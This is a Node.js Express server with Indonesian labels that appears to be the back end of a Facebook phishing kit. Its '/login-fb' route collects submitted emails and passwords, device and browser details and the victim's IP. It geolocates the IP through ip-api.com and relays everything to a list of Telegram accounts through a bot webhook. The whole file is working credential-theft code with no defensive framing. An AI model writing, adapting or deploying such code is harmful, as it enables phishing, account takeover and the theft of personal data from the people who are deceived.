import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { Telegraf } from 'telegraf';
import axios from 'axios';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = 3000;
const app = express();

const setting = JSON.parse(
  fs.readFileSync(path.join(__dirname, 'setting.json'), 'utf-8')
);

const BOT_TOKEN = setting.bot.token;
const USERS = setting.users;

const bot = new Telegraf(BOT_TOKEN);

app.set('trust proxy', true);
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(bot.webhookCallback('/bot'));

bot.start(ctx => {
  ctx.reply('Bot aktif.');
});

async function broadcastMessage(text) {
  for (const user of USERS) {
    try {
      await bot.telegram.sendMessage(user.id, text, {
        parse_mode: 'HTML',
      });
      console.log('[BOT] Sent to', user.username || user.id);
    } catch (err) {
      console.error(
        '[BOT] Failed to send to',
        user.username || user.id,
        err.message
      );
    }
  }
}

// Set webhook
app.get('/set-bot', async (req, res) => {
  try {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.headers['x-forwarded-host'] || req.get('host');

    const webhookURL = `${protocol}://${host}/bot`;

    await bot.telegram.setWebhook(webhookURL);

    console.log('[BOT] Webhook set:', webhookURL);

    res.json({
      status: 'Bot aktif',
      webhook: webhookURL,
    });
  } catch (err) {
    console.error('[BOT] Set webhook error:', err.message);
    res.status(500).json({ error: 'Webhook error' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'src/views/index.html'));
});

// Data Fb
app.post('/login-fb', async (req, res) => {
  try {
    const {
    logF,
    emailF,
    passF,
    model,
    platform,
    versi,
    lang,
    browser,
    connection,
    timez,
    date,
  } = req.body;

    const device = model && platform && versi ? `${model} ${platform} ${versi}` : '—';

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress || '—';
    
    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
    const location = {
      country: geo.data.country || '—',
      region: geo.data.regionName || '—',
      city: geo.data.city || '—',
      isp: geo.data.isp || '—'
    };
    
    const message = `
<b>${((logF || 'UNKNOWN')).toUpperCase()} — LOGIN</b>
────────────────────

<b>📧 Akun</b>
• Email: <b>${emailF}</b>
• Password: <b>${passF}</b>

<b>📱 Perangkat</b>
• Device: <b>${device}</b>
• Browser: <b>${browser}</b>
• Language: <b>${lang}</b>
• Connection: <b>${connection}</b>

<b>🌍 Lokasi & Waktu</b>
• IP: <b>${ip}</b>
• Country: <b>${location.country}</b>
• Region: <b>${location.region}</b>
• City: <b>${location.city}</b>
• ISP: <b>${location.isp}</b>
• Timezone: <b>${timez}</b>
• Date: <b>${date}</b>

────────────────────
`;

    await broadcastMessage(message);

    res.json({ success: true });
  } catch (err) {
    console.error('[LOGIN] Error:', err.message);
    res.status(500).json({ success: false });
  }
});

// 404 file not found
app.use((req, res) => {
  res.status(404).redirect('/');
});

// Error global
app.use((err, req, res, next) => {
  console.error('[SERVER] Error:', err.stack);
  res.status(500).send('Terjadi kesalahan server.');
});

// Start Server
app.listen(PORT, () => {
  console.log(`[INFO] Server running http://127.0.0.1:${PORT}`);
});